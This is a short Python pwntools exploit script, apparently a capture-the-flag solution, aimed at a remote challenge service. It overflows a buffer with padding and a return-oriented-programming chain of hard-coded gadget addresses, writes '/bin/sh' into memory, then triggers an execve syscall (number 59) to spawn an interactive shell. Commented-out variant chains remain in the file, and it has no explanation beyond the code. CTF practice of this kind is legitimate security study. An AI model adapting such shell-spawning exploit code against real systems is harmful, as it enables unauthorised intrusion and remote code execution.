from pwn import *
p=process("./main")
p=remote('chal.78727867.xyz', 34000)
payload=b'\x00'+b'a'*55+p64(0x0000000000403a44)+p64(0x00000000004aa000)+p64(0)+p64(0x0000000000403d5a)+p64(8)+p64(0)+p64(0x402f66)+p64(0x4030a0)
p.sendline(payload)
p.sendline(b'/bin/sh')
#payload+=p64(0x0000000000403d5a)+p64(0)+p64(0)+p64(0x00000000004297c3)+p64(59)+p64(0x00000000004025ea)
# input()
# p64(0x4ae8c0)+p64(0)+p64(0x40c2f0)+p64(0x4030a0)#+p64(0)+p64(0x00000000004297c3)+p64(0)+p64(0x00000000004025ea)
# 
# payload=b'\x00'+b'a'*55+p64(0x0000000000403a44)+p64(b)+p64(0)+p64(0x0000000000403d5a)+p64(0)+p64(0)+p64(0x00000000004297c3)+p64(59)+p64(0x00000000004025ea)
#input()
payload=b'\x00'+b'a'*55+p64(0x0000000000403a44)+p64(0x00000000004aa000)+p64(0)+p64(0x0000000000403d5a)+p64(0)+p64(0)+p64(0x00000000004297c3)+p64(59)+p64(0x00000000004025ea)
p.sendline(payload)
p.interactive()
